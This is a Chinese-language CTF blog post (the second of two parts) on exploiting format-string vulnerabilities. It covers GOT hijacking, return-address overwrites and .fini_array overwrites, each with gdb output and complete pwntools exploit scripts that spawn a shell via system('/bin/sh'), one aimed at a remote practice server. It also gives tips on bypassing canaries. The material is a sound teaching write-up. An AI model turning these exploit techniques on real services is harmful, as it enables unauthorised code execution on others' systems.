@@ -1,0 +1,965 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content>
+  <meta name="author" content="chumen77">
+  <meta name="keywords" content>
+  <title>格式化字符串漏洞小总结（下） - Chumen77&#39;s Blog</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    
+      
+      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/atom-one-dark.min.css">
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-04-03 16:59" pubdate>
+        2020年4月3日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      65
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">格式化字符串漏洞小总结（下）</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="格式化字符串漏洞小总结（下）"><a href="#格式化字符串漏洞小总结（下）" class="headerlink" title="格式化字符串漏洞小总结（下）"></a>格式化字符串漏洞小总结（下）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接着上一篇，这一篇主要记录一下对于这个漏洞的利用和ctf赛题中常见的套路和考法。</p>
+<h2 id="格式化字符串在栈上"><a href="#格式化字符串在栈上" class="headerlink" title="格式化字符串在栈上"></a>格式化字符串在栈上</h2><h3 id="劫持got"><a href="#劫持got" class="headerlink" title="劫持got"></a>劫持got</h3><ul>
+<li>每次 call libc 中的函数时都会去GOT表中查询来找出程序下一步要jmp的位址</li>
+<li>可以通过 fmt 构造写入一个目标地址，改掉 GOT 表上的地址使得call该函数时变成jmp到我们要的目标地址去<br>例如 ：<br>将 printf 改成 system，原本 printf (“sh’’）就直接变成 system (“sh”),便可以拿到shell。<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/0G62iR.png" srcset="/img/loading.gif" alt><br>这一攻击过程可以分为以下几个步骤：</li>
+<li>确定一下printf函数的GOT表的地址，如图中是<code>0x804a010</code></li>
+<li>确定一下system函数的内存地址或者plt（通常都需要泄漏一下libc的基地址，然后加上偏移算出，当然也会遇到程序直接存在system函数，那么就是plt）</li>
+<li>在栈上构造出printf函数GOT表的地址</li>
+<li>利用fmt漏洞修改printf函数GOT表上的地址</li>
+</ul>
+<p>然后看一个例题：</p>
+<h4 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy-echo"></a>inndy-echo</h4><h5 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span>
+<span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span>
+<span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span>
+<span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
+<span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div>
+
+<h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __cdecl __<span class="hljs-function">noreturn <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span>
+</span>&#123;
+  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+Ch] [ebp-10Ch]</span>
+  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+10Ch] [ebp-Ch]</span>
+
+  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);
+  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);
+  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);
+  <span class="hljs-keyword">do</span>
+  &#123;
+    fgets(&amp;s, <span class="hljs-number">256</span>, <span class="hljs-built_in">stdin</span>);
+    <span class="hljs-built_in">printf</span>(&amp;s);
+  &#125;
+  <span class="hljs-keyword">while</span> ( <span class="hljs-built_in">strcmp</span>(&amp;s, <span class="hljs-string">"exit\n"</span>) );
+  system(<span class="hljs-string">"echo Goodbye"</span>);
+  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+&#125;</code></pre></div>
+
+<p>可以看到会无限的打印你输入的东西，那就意味着可以无限次触发这个漏洞。并且还有system这个函数，那可以直接找其plt。</p>
+<h6 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h6><ul>
+<li>在栈上放好printf函数的GOT表地址，并确定一下偏移</li>
+<li>改这个GOT上的地址为system函数的plt</li>
+<li>改好一会，传送一个<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></li>
+</ul>
+<p>在执行的过程中需要注意一下，改GOT表上的值<strong>要单次printf多次写入</strong>，否则只改一般程序会出现无法预料的情况。还有就是需要注意一下<strong>字节对齐</strong>。</p>
+<h5 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h5><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ stack <span class="hljs-number">0x20</span>
+<span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd250</span> --&gt; <span class="hljs-number">0xffffd26c</span> (<span class="hljs-string">"AAAA<span class="hljs-subst">\n</span>"</span>)
+<span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd254</span> --&gt; <span class="hljs-number">0x100</span>
+<span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd258</span> --&gt; <span class="hljs-number">0xf7fb25a0</span> --&gt; <span class="hljs-number">0xfbad208b</span>
+<span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd25c</span> --&gt; <span class="hljs-number">0x0</span>
+<span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd260</span> --&gt; <span class="hljs-number">0xf7ffd000</span> --&gt; <span class="hljs-number">0x23f40</span>
+<span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd264</span> --&gt; <span class="hljs-number">0x80482e7</span> (<span class="hljs-string">"__libc_start_main"</span>)
+<span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd268</span> --&gt; <span class="hljs-number">0xf63d4e2e</span>
+<span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd26c</span> (<span class="hljs-string">"AAAA<span class="hljs-subst">\n</span>"</span>)</code></pre></div>
+
+<div class="hljs"><pre><code class="hljs undefined">gdb-peda$ fmtarg <span class="hljs-number">0xffffd26c</span>
+The <span class="hljs-keyword">index</span> of <span class="hljs-keyword">format</span> argument : <span class="hljs-number">7</span> (<span class="hljs-string">"\%6$p"</span>)</code></pre></div>
+
+<p>确定偏移是7，但需要注意字节对齐，打算一会在写payload时候，就<code>().ljust</code>补成0x20的<code>a</code>，也就是<code>offset = 7 + 0x20/4 = 15</code></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">'debug'</span>
+context.arch = <span class="hljs-string">'i386'</span>
+<span class="hljs-comment"># io = process('./echo')</span>
+io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26990</span>)
+system_plt = <span class="hljs-number">0x08048400</span>
+printf_got = <span class="hljs-number">0x0804A010</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>
+    result = <span class="hljs-string">""</span>
+    <span class="hljs-keyword">if</span> prev &lt; val :
+        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>
+    <span class="hljs-keyword">elif</span> prev == val :
+        result += <span class="hljs-string">''</span>
+    <span class="hljs-keyword">else</span> :
+        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>
+    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>
+    <span class="hljs-keyword">return</span> result
+
+prev = <span class="hljs-number">0</span> 
+payload = <span class="hljs-string">""</span>
+key = <span class="hljs-number">0x08048400</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>):
+    payload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">15</span>+i) 
+    prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>
+
+payload = payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) + p32(printf_got) + p32(printf_got+<span class="hljs-number">2</span>)
+raw_input(<span class="hljs-string">'-&gt;'</span>)
+io.sendline(payload)
+io.send(<span class="hljs-string">'/bin/sh\x00'</span>)
+io.interactive()</code></pre></div>
+
+<p>换一种就是用pwntools中针对格式化字符串漏洞利用模块中的函数<code>fmtstr_payload</code>，面对32位，这种情况还是很好用的：</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">'debug'</span>
+context.arch = <span class="hljs-string">'i386'</span>
+<span class="hljs-comment"># io = process('./echo')</span>
+io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26990</span>)
+system_plt = <span class="hljs-number">0x08048400</span>
+printf_got = <span class="hljs-number">0x0804A010</span>
+payload = fmtstr_payload(<span class="hljs-number">7</span>,&#123;printf_got : system_plt&#125;)
+io.sendline(payload)
+io.send(<span class="hljs-string">'/bin/sh\x00'</span>)
+io.interactive()</code></pre></div>
+
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/TxIVwQ.png" srcset="/img/loading.gif" alt><br>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。（不过听说pwntools的新版本是已经支持64位了，但是本人一直没有更新成功，所以也没有测试）</p>
+<h3 id="劫持retaddress"><a href="#劫持retaddress" class="headerlink" title="劫持retaddress"></a>劫持retaddress</h3><p>顾名思议，就是利用格式化串漏洞来修改函数的返回地址到我们想要jmp的地址。常见套路：</p>
+<ul>
+<li>jmp到带有<code>system(/bin/sh)</code> 的后门函数</li>
+<li>不开nx保护，jmp到自己构造的shellcode上。</li>
+<li>提前泄漏libc算出libc的base，jmp到onegadget地址</li>
+</ul>
+<p>看一个简单的例子：</p>
+<h4 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme-k0"></a>三个白帽 - pwnme-k0</h4><h5 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span>
+<span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span>
+<span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span>
+<span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
+<span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div>
+
+<p>64位程序，且开启了RELRO保护，这样就无法修改got表了。</p>
+<h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p>这个程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出程序。其中在展示用户信息当中，存在格式化字符串漏洞：</p>
+<div class="hljs"><pre><code class="hljs c">
+<span class="hljs-keyword">int</span> __<span class="hljs-function">fastcall <span class="hljs-title">sub_400B07</span><span class="hljs-params">(<span class="hljs-keyword">char</span> format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="hljs-keyword">char</span> formata, __int64 a8, __int64 a9)</span>
+</span>&#123;
+  write(<span class="hljs-number">0</span>, <span class="hljs-string">"Welc0me to sangebaimao!\n"</span>, <span class="hljs-number">0x1A</span>uLL);
+  <span class="hljs-built_in">printf</span>(&amp;formata, <span class="hljs-string">"Welc0me to sangebaimao!\n"</span>);
+  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;a9 + <span class="hljs-number">4</span>);
+&#125;</code></pre></div>
+
+<p>并且发现其中输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt></p>
+<p>还发现其中有个后门函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lRHun0.png" srcset="/img/loading.gif" alt></p>
+<p>会调用system函数给你shell，那攻击思路也就是去修改程序中某个函数的返回地址，直接返回到这里就拿到shell了。</p>
+<h5 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h5><p>定位到这个存在漏洞的printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt><br>看一下此时的栈情况，输入的usename可以确定偏移是8，并且rdi也是指向了存放password的地址。</p>
+<p>然后发现栈上也有很多栈的地址信息，当程序第二次运行到这里的时候，发现这里esp对应的地址信息也是不会变的。所以就可以通过泄漏这里的值来算出存放ret address的栈地址。</p>
+<p>然后让程序运行到修改用户信息的函数，这下把ret address的point放到栈上，接着就可以开始修改ret address的值了。</p>
+<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">'debug'</span>
+context.arch = <span class="hljs-string">'amd64'</span>
+io = process(<span class="hljs-string">'./pwnme_k0'</span>)
+<span class="hljs-comment"># context.clear(arch = 'amd64')</span>
+io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)
+io.sendline(<span class="hljs-string">'%0006$lx'</span>)
+io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)
+io.sendline(<span class="hljs-string">'11111111'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+io.sendline(<span class="hljs-string">'1'</span>)
+<span class="hljs-comment"># io.recvuntil('Welc0me to sangebaimao!\n')</span>
+stack = int(io.recvline_contains(<span class="hljs-string">'7f'</span>),<span class="hljs-number">16</span>)
+print(stack)
+ret_add = stack - <span class="hljs-number">0x38</span>
+<span class="hljs-comment"># system_add = 0x04008AA</span>
+payload = <span class="hljs-string">'%2218c%8$hn'</span>
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+io.sendline(<span class="hljs-string">'2'</span>)
+io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)
+io.sendline(p64(ret_add))
+io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)
+io.sendline(payload)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+io.sendline(<span class="hljs-string">'1'</span>)
+io.interactive()</code></pre></div>
+
+<h3 id="修改FINI-ARRAY区"><a href="#修改FINI-ARRAY区" class="headerlink" title="修改FINI_ARRAY区"></a>修改<code>FINI_ARRAY</code>区</h3><p>在上面的两个例子中可以发现,之所以能成功利用格式化字符串漏洞getshell,很多时候都是因为程序中存在循环，让我们可以多次触发格式化字符串漏洞。如果程序中不存在循环呢?利用ROP劫持函数返回地址到start可以实现；当存在格式化字符串漏洞时，使用这个漏洞也做到这一<br>点。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/NgjlR4.png" srcset="/img/loading.gif" alt><br>简单地说,一个程序在调用 main函数前会调用<code>.init</code>段代码和 <code>.init_array</code> 段的函数数组中每一个函数指针。同样的,main 函数结束后也会调用<code>.fini</code>段代码和 <code>.fini_arrary</code> 段的函数数组中的每一个函数指针。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/ioam7T.png" srcset="/img/loading.gif" alt><br>其中<code>FINI_ARRAY</code>区：程序结束需要经过这里，是可以修改一下这里的析构函数。修改<code>.fini_array</code>区的第一个元素为start，就可以实现让程序从头再来一次，也就又可以用一次漏洞。</p>
+<p>需要注意的是,这个区的内容在再次从start开始执行后又会被修改。</p>
+<h4 id="mma-ctf-2nd-2016-greeting"><a href="#mma-ctf-2nd-2016-greeting" class="headerlink" title="mma-ctf-2nd-2016-greeting"></a>mma-ctf-2nd-2016-greeting</h4><h5 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span>
+<span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span>
+<span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span>
+<span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
+<span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div>
+
+<h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span>
+</span>&#123;
+  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+1Ch] [ebp-84h]</span>
+  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+5Ch] [ebp-44h]</span>
+  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+9Ch] [ebp-4h]</span>
+
+  v6 = __readgsdword(<span class="hljs-number">0x14</span>u);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please tell me your name... "</span>);
+  <span class="hljs-keyword">if</span> ( !getnline(&amp;v5, <span class="hljs-number">64</span>) )
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Don't ignore me ;( "</span>);
+  <span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"Nice to meet you, %s :)\n"</span>, &amp;v5);
+  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;s);
+&#125;</code></pre></div>
+
+<p>发现函数在触发格式化字符串漏洞以后就结束了，没有在调用其他的函数，也就无法利用GOT劫持或者修改ret addr。<br>再看下getnline函数：</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">size_t</span> __<span class="hljs-function">cdecl <span class="hljs-title">getnline</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s, <span class="hljs-keyword">int</span> n)</span>
+</span>&#123;
+  <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span>
+
+  fgets(s, n, <span class="hljs-built_in">stdin</span>);
+  v3 = <span class="hljs-built_in">strchr</span>(s, <span class="hljs-number">10</span>);
+  <span class="hljs-keyword">if</span> ( v3 )
+    *v3 = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strlen</span>(s);
+&#125;</code></pre></div>
+
+<p>发现有了strlen的函数，并且其参数也是可以控制的。<br>这就有了攻击思路，在触发格式化字符串的漏洞时：</p>
+<ul>
+<li>修改<code>.fini_array</code>区的一个函数指针地址为start，让其重启跑一次程序</li>
+<li>因为知道肯定会跑到strlen那里，所以在劫持strlen的GOT为system</li>
+<li>待程序重新跑起来，就在传送一个<code>/bin/sh</code>即可</li>
+</ul>
+<p>注意的是,这个<code>.fini_array</code>区的内容在再次从start开始执行后又会被修改,且程序可读取的字节数有限,因此需要同时修改两个地址，也就是单次printf多次写入，这个题并且需要合理调整payload。</p>
+<h5 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h5><p><img src="http://qiqianyun.chumen77.xyz/uPic/wRVcqD.png" srcset="/img/loading.gif" alt><br>这个题目因为前面有</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"Nice to meet you, %s :)\n"</span>, &amp;v5);</code></pre></div>
+
+<p>所以其栈上会放上<code>Nice to meet you,</code>的字符串，此时需要注意对齐。对齐后发现偏移为12，在写payload的时候可以使用单次printf多次写入的脚本，所以来<code>().ljust(0x32,&#39;a&#39;)</code> ,所以偏移需要加上<code>(0x32 - 2)/4</code> =  24 </p>
+<h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'i386'</span>
+context.log_level = <span class="hljs-string">'debug'</span>
+io = process(<span class="hljs-string">'./greeting'</span>)
+<span class="hljs-comment"># io = remote('111.198.29.45',42729)</span>
+elf = ELF(<span class="hljs-string">'./greeting'</span>)
+strlen_got = <span class="hljs-number">0x08049A54</span>
+fini_array = <span class="hljs-number">0x08049934</span>
+start = <span class="hljs-number">0x080484F0</span>
+system_plt = <span class="hljs-number">0x08048490</span>
+offset = <span class="hljs-number">12</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>
+    result = <span class="hljs-string">""</span>
+    <span class="hljs-keyword">if</span> prev &lt; val :
+        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>
+    <span class="hljs-keyword">elif</span> prev == val :
+        result += <span class="hljs-string">''</span>
+    <span class="hljs-keyword">else</span> :
+        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>
+    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>
+    <span class="hljs-keyword">return</span> result
+key1 = <span class="hljs-number">0x08048490</span>
+prev = <span class="hljs-number">18</span> <span class="hljs-comment">#注意这个题在可控格式化字符串前有字符输出</span>
+payload = <span class="hljs-string">""</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>):
+    payload +=fmt_short(prev,(key1 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">24</span>+i) 
+    prev = (key1 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>
+key2 = <span class="hljs-number">0x84F0</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):
+    payload +=fmt_short(prev,(key2 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">26</span>+i) 
+    prev = (key2 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>
+payload = payload.ljust(<span class="hljs-number">0x32</span>,<span class="hljs-string">'a'</span>)
+payload += p32(strlen_got) + p32(strlen_got+<span class="hljs-number">2</span>) +p32(fini_array)
+io.recvuntil(<span class="hljs-string">'name...'</span>)
+raw_input(<span class="hljs-string">'-&gt;'</span>)
+io.sendline(payload)
+io.recvuntil(<span class="hljs-string">'name...'</span>)
+io.sendline(<span class="hljs-string">'/bin/sh\x00'</span>)
+io.interactive()</code></pre></div>
+
+<h3 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h3><h4 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h4><p>可以利用fmt漏洞，任意读的特性，在有canary的程序中，算好偏移以后读出canary存的检验值（基本都是以00结尾比较好找），然后在buffer overflow 时，在对应位置填上canary检验值，即可绕过canary。</p>
+<h4 id="printf家族的其他函数"><a href="#printf家族的其他函数" class="headerlink" title="printf家族的其他函数"></a>printf家族的其他函数</h4><p>首先要记得一点函数参数的入栈顺序，大多是从右到左依次入栈，在遇到其他的printf类函数，在确定偏移时，一定要要把握fmt是在栈上的那个位置，然后进行计算偏移（不能简单的利用pwndbg的fmtarg了）。</p>
+<ul>
+<li>fprintf：基本上一样，只是format string 不在第一参数，使得overwrite function table 时很难使用</li>
+<li>sprintf：可以用%xxc 来造成新的buffer overflow </li>
+</ul>
+<h4 id="劫持-stack-chk-fail"><a href="#劫持-stack-chk-fail" class="headerlink" title="劫持__stack_chk_fail"></a>劫持<code>__stack_chk_fail</code></h4><ul>
+<li>在无法 stack overflow 也没有其它函数可以劫持时，可以使用修改<code>__stack_chk_fail</code> 的 G0T 并且破坏 canary 使这个函数被call，然后jmp想要的目标地址</li>
+<li>在只有一次 stack overflow+fmt 时可以将<code>__stack_chk_fail</code>改成直接ret ，这样stack overflow 时可以无视canary ，也可以放上ROP链，进而进入之后的ROP。</li>
+</ul>
